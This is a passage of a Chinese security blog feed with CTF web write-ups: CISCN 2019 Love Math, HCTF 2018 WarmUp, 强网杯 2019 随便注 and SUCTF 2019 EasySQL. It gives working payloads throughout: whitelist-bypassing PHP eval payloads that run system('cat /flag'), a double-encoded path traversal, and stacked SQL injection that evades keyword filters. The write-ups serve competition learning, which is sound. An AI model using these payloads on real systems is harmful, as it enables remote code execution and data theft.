[<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目限制了参数的长度要小于80，且不能包含空格、制表符、换行、单双引号、反引号、[]。并且输入的字符串需要为 $whitelist 中的函数</p><p>单双引号被禁止了，函数名提取字符串就无法实现，但是可以想办法从函数的返回结果中获取。   </p><p>base_convert<br><img src="../../images/php/lovemath/1.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'phpinfo'</span>, <span class="number">36</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="number">55490343972</span>,<span class="number">10</span>,<span class="number">36</span>);</span><br><span class="line"><span class="comment">//55490343972</span></span><br><span class="line"><span class="comment">//phpinfo</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/php/lovemath/2.jpg" alt=""></p><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>使用php函数readfile等函数读取文件，但是需要flag.php中的.。<br>相关函数： </p><ul><li>dechex 十进制转换为十六进制</li><li>hexdec 十六进制转换为十进制</li><li>hex2bin 转换十六进制字符串为二进制字符串</li><li>bin2hex 函数把包含数据的二进制字符串转换为十六进制值</li><li>pi作为变量是因为题目有长度限制，白名单中最短的就是这两个字符pi</li></ul><p>这里获取.,借助dechex和hex2bin函数，不过hex2bin不在白名单里，还需用base_convert转换。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> hex2bin(dechex(<span class="number">46</span>));</span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$pi</span>=base_convert)(2146934604002,10,36)(<span class="variable">$pi</span>(727432,10,36).<span class="variable">$pi</span>(37907361743,10,36)(dechex(46)).<span class="variable">$pi</span>(33037,10,36));</span><br></pre></td></tr></table></figure><p>不过超出了长度限制</p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>使用exec等命令执行<code>nl /*</code>读取文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'exec'</span>, <span class="number">36</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'hex2bin'</span>, <span class="number">36</span>, <span class="number">13</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> hexdec(bin2hex(<span class="string">'nl /*'</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">47138</span></span><br><span class="line"><span class="comment">3761671484</span></span><br><span class="line"><span class="comment">474260451114</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=(<span class="variable">$pi</span>=base_convert)(47138,20,36)(<span class="variable">$pi</span>(3761671484,13,36)(dechex(474260451114)))</span><br></pre></td></tr></table></figure><p>不过这只能打印出同级目录文件下的flag，flag在其他位置就无法打印</p><h1 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h1><p>刚开始我们知道可以异或出<code>_</code>。并且$没有被 waf，因此我们可以使用<code>$_GET</code>全局变量手动传入参数getshell。<br>虽然[]被过滤，我们依然可以使用{}来提取数组中的值。    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'1517'</span>^<span class="string">'nrtc'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'1517'</span>, <span class="number">36</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'nrtc'</span>, <span class="number">36</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">_GET</span></span><br><span class="line"><span class="comment">53179</span></span><br><span class="line"><span class="comment">1109136</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?0=system&amp;1=cat /flag&amp;c=<span class="variable">$pi</span>=base_convert;<span class="variable">$pi</span>=<span class="variable">$pi</span>(53179,10,36)^<span class="variable">$pi</span>(1109136,10,36);<span class="variable">$&#123;$pi&#125;</span>&#123;0&#125;(<span class="variable">$&#123;$pi&#125;</span>&#123;1&#125;)</span><br></pre></td></tr></table></figure><h1 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h1><p>就是用可用的函数和字母进行异或生成大量的字母组合（php中函数名默认为字符串），然后寻找可用的组合 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;<span class="number">9</span>;$j++)&#123;</span><br><span class="line"><span class="keyword">for</span>($a = <span class="number">0</span>;$a &lt;=<span class="number">9</span>;$a++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j.$a;</span><br><span class="line">            <span class="keyword">echo</span>($payload[$k].<span class="string">"^$i$j$a"</span>.<span class="string">"==&gt;$exp"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../../images/php/lovemath/1.png" alt=""><br><img src="../../images/php/lovemath/2.png" alt=""><br><img src="../../images/php/lovemath/3.png" alt=""><br><img src="../../images/php/lovemath/4.png" alt=""><br>最终payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=(is_infinite^(6).(4)).(rad2deg^(7).(5));($<span class="variable">$pi</span>)&#123;pi&#125;(($<span class="variable">$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br><span class="line">?c=<span class="variable">$pi</span>=(is_nan^(6).(4)).(tan^(1).(5));<span class="variable">$pi</span>=$<span class="variable">$pi</span>;<span class="variable">$pi</span>&#123;0&#125;(<span class="variable">$pi</span>&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure><h1 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h1><p>如何构造出合适的base_convert进制转换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'hex2bin'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">2</span>; $i &lt; <span class="number">37</span>; $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">2</span>; $j &lt; <span class="number">37</span>; $j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_numeric(base_convert($a, $i, $j)))&#123;</span><br><span class="line">            <span class="keyword">if</span>(base_convert(base_convert($a, $i, $j), $j, $i) === $a)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'len='</span>.strlen(base_convert($a, $i, $j)).<span class="string">' '</span>.<span class="string">'base_convert参数-&gt;'</span>.base_convert($a, $i, $j).<span class="string">' '</span>.$j.<span class="string">' '</span>.$i.<span class="string">' '</span>.<span class="string">"\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>dechex的构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"_GET"</span>;</span><br><span class="line">$num = hexdec(bin2hex($a));</span><br><span class="line"><span class="keyword">echo</span> $num . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> (base_convert(<span class="number">3761671484</span>,<span class="number">13</span>,<span class="number">36</span>)(dechex($num)));</span><br><span class="line"><span class="comment">//1598506324</span></span><br><span class="line"><span class="comment">//_GET</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>paydload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert(3761671484,13,36)(dechex(1598506324));($<span class="variable">$pi</span>)&#123;1&#125;(($<span class="variable">$pi</span>)&#123;2&#125;)&amp;1=system&amp;2=tac /flag</span><br></pre></td></tr></table></figure><h1 id="方法六"><a href="#方法六" class="headerlink" title="方法六"></a>方法六</h1><p>相关函数：</p><ul><li>getallheaders：获取全部 HTTP 请求头信息</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'exec'</span>, <span class="number">36</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'getallheaders'</span>, <span class="number">30</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//47138</span></span><br><span class="line"><span class="comment">//8768397090111664438</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(47138,20,36)(<span class="variable">$pi</span>(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure><p>exec(getallheaders(){1})，可以获取请求头第一个字段的值，[]被waf可以用{}包囊数字来解决代替绕过中括号和引号<br><img src="../../images/php/lovemath/3.jpg" alt=""><br>参考文章：</p><p><a href="https://blog.csdn.net/qq_44657899/article/details/106104340" target="_blank" rel="noopener">https://blog.csdn.net/qq_44657899/article/details/106104340</a><br><a href="https://www.extrader.top/posts/a649e496" target="_blank" rel="noopener">https://www.extrader.top/posts/a649e496</a><br><a href="https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[CISCN 2019 初赛]Love Math  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF-WEB-WRITEUP</title>
    <link href="https://blog.cfyqy.com/article/7d6323b8.html"/>
    <id>https://blog.cfyqy.com/article/7d6323b8.html</id>
    <published>2020-12-29T12:58:56.000Z</published>
    <updated>2021-01-20T09:05:58.078Z</updated>
    
    <content type="html"><![CDATA[<p>BUUCTF是一个ctf平台,里面都是一些经典赛题。</p><a id="more"></a> <h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>查看源码，注释有source.php，访问得到源码<br>source.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由源码可知只有重点要绕过emmm::checkFile($_REQUEST[‘file’]) ，实现任意文件包含读取。 可知存在hint.php文件，访问 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;source.php?file&#x3D;hint.php</span><br></pre></td></tr></table></figure><p>提示 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>可知flag存在 中 ，要实现包含读取ffffllllaaaagggg，要先让checkFile 返回True，从下面这部分源码着手 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">         $page,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">     );</span><br><span class="line">     <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     $_page = urldecode($page);</span><br><span class="line">     $_page = mb_substr(</span><br><span class="line">         $_page,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">     );</span><br><span class="line">     <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure><p>从源码可知先对传入的字符串末尾加？号，进行以？为分割符进行字符串截取，接着url解码，然后再次加？号以？为分割符进行字符串截取，最后在进行白名单的判断。我们可以传入一个url编码后的?，前面连接放着白名单的文件，就可以绕过白名单的判断返回True,后面放着我们想要读取的字符串。浏览器会默认帮我们url解码一次，随意我们要将? 二次url编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;hint.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>可得flag<br>我这里对？进行一次url编码可以，倒是有点奇怪，不是会默认解码一次吗?<br>这里还涉及到一个知识点:<br>hint.php%3f双重编码,经过包含时你包含的文件会被当成一个目录</p><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>在注入测试中，可以发现增、删、查、改操作的关键字都被过滤了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>可以使用堆叠注入<br>得到表名1919810931114514、words</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1';  <span class="keyword">show</span> <span class="keyword">tables</span>; <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>得到字段名  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1';  desc 1919810931114514 <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>1919810931114514表有1，hahahah两个字段<br>得到数据   </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'; <span class="keyword">SET</span> @haha_test = <span class="keyword">CONCAT</span>(<span class="string">'S'</span>,<span class="string">'ELECT * from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> pr2 <span class="keyword">FROM</span> @haha_test;<span class="keyword">EXECUTE</span> pr2 ;<span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>这道题一开始以为是盲注， 没做出来，看大佬们的WP.<br>这题目源码 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>重点在 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">select</span> <span class="string">".$post['query']."</span>||flag <span class="keyword">from</span> Flag<span class="string">";</span></span><br></pre></td></tr></table></figure><p>解法一:<br>这里没有过滤<code>*</code> ，直接 <code>*</code>,1就可以了</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1 =&gt; "select *,1||flag from Flag"; (1和flag或运算，select * from Flag)</span><br></pre></td></tr></table></figure><p>解法二：<br>更改配置把||视为字符串连接符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 